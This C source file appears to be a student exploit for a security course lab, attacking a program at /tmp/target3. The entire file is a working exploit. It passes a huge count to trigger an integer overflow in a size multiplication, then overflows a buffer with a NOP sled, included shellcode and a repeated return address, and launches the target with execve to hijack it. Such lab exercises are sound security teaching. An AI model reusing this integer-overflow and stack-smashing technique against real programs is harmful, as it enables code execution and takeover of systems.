#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target3"

#define DEFAULT_OFFSET 7728
#define DEFAULT_BUFFER_SIZE 22272 // 696 * 8 * 4 
#define MAX_S_INT 2147483647
#define NOP 0x90

int main(void)
{
  char *args[3];
  char *env[1];

  /*
  1) Pass the bounds check
  2) Multiply (count * sizeof(struct widget_t))
  3) Overflow to change the return address
  */

  char buff[DEFAULT_BUFFER_SIZE + DEFAULT_OFFSET], *ptr;
  long *addr_ptr, addr;
  int i;
  
  // 2147484348 - 0x800002BC
  // 0x2BC - 700
  ptr = buff;
  
  *(ptr++) = '2';
  *(ptr++) = '1';
  *(ptr++) = '4';
  *(ptr++) = '7';
  *(ptr++) = '4';
  *(ptr++) = '8';
  *(ptr++) = '4';
  *(ptr++) = '3';
  *(ptr++) = '4';
  *(ptr++) = '8';
  *(ptr++) = ',';
  
  addr = 0xbfff3210;
  printf( "Using address: 0x%x\n", addr);

   
  addr_ptr = (long *)ptr;
 
 for( i = 11; i < DEFAULT_OFFSET+DEFAULT_BUFFER_SIZE - 20000; i++)
	*(ptr++) = NOP;

  for( int j = 0; j < strlen(shellcode); j++ ){
	*(ptr++) = shellcode[j];
        i++;
  }	

  
  /*
  for ( i = 0; i < 8; i += 4 )
	  *(addr_ptr++) = addr;

  for( i = 0; i < DEFAULT_OFFSET + DEFAULT_BUFFER_SIZE - strlen(shellcode); i++ )
	  *(ptr++) = NOP;

  for( i = 0; i < strlen(shellcode); i++ )
	  *(ptr++) = shellcode[i];
  */
  
  while(i < 30000 ){
	  buff[i++] = '\xff';
	  buff[i++] = '\xbf';
	  buff[i++] = '\x10';
	  buff[i++] = '\x32';
  }
  args[0] = TARGET; args[1] = buff; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
